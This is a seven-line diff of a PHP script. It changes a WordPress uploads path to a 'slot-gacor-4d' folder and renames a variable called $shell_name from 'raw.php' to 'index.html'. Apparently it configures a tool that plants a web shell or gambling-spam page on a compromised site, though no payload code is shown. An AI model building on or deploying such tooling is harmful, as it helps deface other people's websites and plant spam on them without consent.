@@ -1,7 +1,7 @@
 <?php
 
-$path = "/usr/local/www/arsip/wp-content/uploads/-";
-$shell_name = "raw.php";
+$path = "/usr/local/www/arsip/wp-content/uploads/slot-gacor-4d";
+$shell_name = "index.html";
 $gabung = $path . "/" . $shell_name;
 $khusus_path = $path . "/";
 $backname = explode('.', $shell_name)[0] . ".txt";
